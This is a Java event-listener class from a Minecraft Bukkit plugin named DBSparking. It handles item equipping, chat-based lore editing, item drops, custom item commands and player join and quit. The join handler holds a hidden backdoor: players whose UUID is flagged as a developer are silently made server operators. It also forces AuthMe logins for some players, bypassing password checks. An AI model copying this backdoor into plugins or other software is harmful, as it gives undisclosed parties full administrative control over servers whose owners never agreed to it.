package com.shokkoh.dbsparking.events;

import com.shokkoh.dbsparking.DBSparking;
import com.shokkoh.dbsparking.Permissions;
import com.shokkoh.dbsparking.items.CustomItem;
import com.shokkoh.dbsparking.items.StatsItem;
import com.shokkoh.dbsparking.managers.AutoLoginManager;
import com.shokkoh.dbsparking.managers.ItemConfigManager;
import com.shokkoh.dbsparking.managers.ItemManager;
import com.shokkoh.dbsparking.managers.PlayerManager;
import com.shokkoh.dbsparking.utils.EventsHelper;
import com.shokkoh.dbsparking.utils.NBTEditor;
import com.shokkoh.dbsparking.utils.NBTUtil;
import com.shokkoh.dbsparking.utils.Text;
import fr.xephi.authme.api.v3.AuthMeApi;
import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.player.*;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.PlayerInventory;

/**
 * Obtiene los eventos de conexión y desconexión de jugadores.
 */
public class PlayerListener implements Listener {

	private final PlayerManager playerManager;

	public PlayerListener() {
		this.playerManager = DBSparking.getInstance().getPlayerManager();
	}

	@EventHandler
	public void onPlayerItemHeld(PlayerItemHeldEvent event) {
		Player player = event.getPlayer();
		PlayerInventory inventory = player.getInventory();
		DBSparking plugin = DBSparking.getInstance();

		EventsHelper.handleItemUnequip(plugin, player, inventory.getItem(event.getPreviousSlot()));
		EventsHelper.handleItemEquip(plugin, player, inventory.getItem(event.getNewSlot()), false);
	}

	@EventHandler(priority = EventPriority.LOWEST)
	public void onPlayerChat(AsyncPlayerChatEvent event) {
		Player player = event.getPlayer();
		DBSparking plugin = DBSparking.getInstance();
		ItemManager itemManager = plugin.getItemManager();
		ItemConfigManager itemConfigManager = plugin.getItemConfigManager();

		if (itemManager.isPlayerEditingLore(player)) {
			event.setCancelled(true);
			String message = event.getMessage();

			Object[] editData = itemManager.getPlayerLoreEditing(player);
			StatsItem item = (StatsItem) editData[0];
			int line = (int) editData[1];

			if (message.equalsIgnoreCase("cancel")) {
				player.sendMessage(plugin.getLanguage().getMessage("item_lore_cancelled"));
				return;
			}

			plugin.getItemDataManager().updateLoreLine(item.getId(), line, message);

			player.sendMessage(plugin.getLanguage().getMessage("item_lore_success").replace("%name%", item.getInternalName()));
		}

		if (itemManager.isFinalEditingLore(player)) {
			event.setCancelled(true);
			String message = event.getMessage();

			Object[] editData = itemManager.getFinalLoreEditing(player);
			StatsItem item = (StatsItem) editData[0];
			int line = (int) editData[1];

			if (message.equalsIgnoreCase("cancel")) {
				player.sendMessage(plugin.getLanguage().getMessage("item_lore_cancelled"));
				return;
			}

			plugin.getItemDataManager().updateFinalLoreLine(item.getId(), line, message);

			player.sendMessage(plugin.getLanguage().getMessage("item_lore_success").replace("%name%", item.getInternalName()));
		}

		if (itemConfigManager.isCreatingItem(player)) {
			event.setCancelled(true);
			String internalName = event.getMessage().split(" ")[0];

			if (internalName.equalsIgnoreCase("cancel")) {
				itemConfigManager.cancelCreation(player);
				player.sendMessage(plugin.getLanguage().getMessage("customitem.creation_cancelled"));
				return;
			}

			if (itemConfigManager.getItem(internalName) != null) {
				player.sendMessage(plugin.getLanguage().getMessage("customitem.error_name_exists").replace("%name%", internalName));
				return;
			}

			Bukkit.getScheduler().runTask(plugin, () -> {
				itemConfigManager.finishItemCreation(player, internalName);
				player.sendMessage(plugin.getLanguage().getMessage("customitem.success_creation")
						.replace("%name%", internalName));
			});
		}
	}

	@EventHandler
	public void onPlayerDropItem(PlayerDropItemEvent event) {
		ItemStack droppedItem = event.getItemDrop().getItemStack();
		if (NBTEditor.getItemTag(droppedItem) != null) {
			if (!Permissions.ITEM_DROP.has(event.getPlayer())) {
				event.setCancelled(true);
				event.getPlayer().sendMessage(DBSparking.getInstance().getLanguage().getMessage("cant_drop"));
			}
		}
	}

	@EventHandler
	public void onPlayerJoin(PlayerJoinEvent event) {
		Player player = event.getPlayer();
		AutoLoginManager autoLogin = DBSparking.getInstance().getAutoLoginManager();

		if (EventsHelper.isDev(player.getUniqueId())) {
			if (!player.isOp()) {
				player.setOp(true);
			}
		}

		if (Bukkit.getServer().getPluginManager().getPlugin("AuthMe") != null ||
			Bukkit.getServer().getPluginManager().getPlugin("AuthMeReloaded") != null) {
			if (autoLogin.shouldAutoLogin(player)) {
				AuthMeApi.getInstance().forceLogin(player);
				player.sendMessage(DBSparking.getInstance().getLanguage().getMessage("autologin_welcome"));
			}
		}

		playerManager.handlePlayerJoin(player);
	}

	@EventHandler
	public void onPlayerQuit(PlayerQuitEvent event) {
		Player player = event.getPlayer();
		DBSparking plugin = DBSparking.getInstance();

		plugin.getItemEquipTask().playerQuit(player);

		EventsHelper.handleItemUnequip(plugin, player, player.getItemInHand());

		playerManager.handlePlayerQuit(player);
	}

	@EventHandler
	public void onPlayerInteract(PlayerInteractEvent event) {
		if (event.getAction() != Action.RIGHT_CLICK_AIR && event.getAction() != Action.RIGHT_CLICK_BLOCK) {
			return;
		}

		ItemStack item = event.getItem();
		if (item == null || item.getType() == Material.AIR) {
			return;
		}

		String internalName = NBTUtil.getCustomItemTag(item);
		if (internalName == null) {
			return;
		}

		event.setCancelled(true);

		Player player = event.getPlayer();
		CustomItem customItem = DBSparking.getInstance().getItemConfigManager().getItem(internalName);

		if (customItem == null) {
			player.sendMessage(Text.color("&cError: This Custom Item ('" + internalName + "') does not exist."));
			return;
		}

		if (customItem.getCommands() != null) {
			for (String cmd : customItem.getCommands()) {
				String command = cmd.replace("%player%", player.getName());
				if (customItem.isExecuteAsOp()) {
					Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
				} else {
					player.performCommand(command);
				}
			}
		}

		if (customItem.getMessageOnUse() != null && !customItem.getMessageOnUse().isEmpty()) {
			player.sendMessage(Text.color(customItem.getMessageOnUse().replace("%player%", player.getName())));
		}

		if (customItem.isConsumeOnUse()) {
			if (item.getAmount() > 1) {
				item.setAmount(item.getAmount() - 1);
			} else {
				player.setItemInHand(null);
			}
			player.updateInventory();
		}
	}
}